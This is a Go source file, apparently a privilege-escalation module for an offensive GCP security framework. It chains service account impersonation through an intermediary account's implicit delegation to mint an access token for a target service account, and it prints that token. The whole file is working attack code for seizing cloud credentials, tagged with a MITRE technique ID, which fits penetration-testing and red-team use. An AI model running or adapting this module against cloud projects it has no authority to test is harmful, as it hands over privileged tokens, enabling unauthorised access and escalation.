package iam

import (
	"context"
	"fmt"

	iamcredentials "google.golang.org/api/iamcredentials/v1"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&EscalateImplicitDelegation{})
}

// EscalateImplicitDelegation chains through an intermediary SA to impersonate a target SA.
type EscalateImplicitDelegation struct{}

func (m *EscalateImplicitDelegation) Info() module.Info {
	return module.Info{
		Name:         "privesc.iam.escalate-implicit-delegation",
		Tactic:       module.TacticPrivesc,
		Service:      "iam",
		Description:  "Chain through an intermediary service account to impersonate a target SA via implicit delegation",
		RequiresAuth: true,
		AttackID:     "T1134.001",
	}
}

func (m *EscalateImplicitDelegation) Run(ctx module.RunContext) error {
	targetSA := ctx.Flags["target-sa"]
	delegateSA := ctx.Flags["delegate-sa"]

	if targetSA == "" || delegateSA == "" {
		output.Warn("Usage: run privesc.iam.escalate-implicit-delegation --target-sa <final-target-email> --delegate-sa <intermediary-email>")
		output.Info("Tip: The caller must be able to impersonate the delegate SA, and the delegate must be able to impersonate the target SA.")
		return nil
	}

	scope := ctx.Flags["scope"]
	if scope == "" {
		scope = "https://www.googleapis.com/auth/cloud-platform"
	}

	svc, err := iamcredentials.NewService(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create iamcredentials client: %w", err)
	}

	output.Info("Attempting delegation chain: caller -> %s -> %s", delegateSA, targetSA)

	delegates := []string{
		fmt.Sprintf("projects/-/serviceAccounts/%s", delegateSA),
	}

	resp, err := svc.Projects.ServiceAccounts.GenerateAccessToken(
		fmt.Sprintf("projects/-/serviceAccounts/%s", targetSA),
		&iamcredentials.GenerateAccessTokenRequest{
			Scope:     []string{scope},
			Delegates: delegates,
		},
	).Do()
	if err != nil {
		return fmt.Errorf("implicit delegation failed: %w", err)
	}

	output.Success("Token generated for %s via delegation through %s", targetSA, delegateSA)
	output.Info("Expires: %s", resp.ExpireTime)

	if ctx.Verbose {
		fmt.Printf("\n  Access Token: %s\n\n", resp.AccessToken)
	} else {
		output.Info("Token: %s... (use -v to display full token)", resp.AccessToken[:20])
	}

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "privesc.iam.escalate-implicit-delegation",
			Severity:    module.SevCritical,
			Title:       "Successfully chained SA impersonation via implicit delegation",
			Description: fmt.Sprintf("Generated access token for %s by delegating through %s", targetSA, delegateSA),
			Resource:    targetSA,
		}
	}

	return nil
}
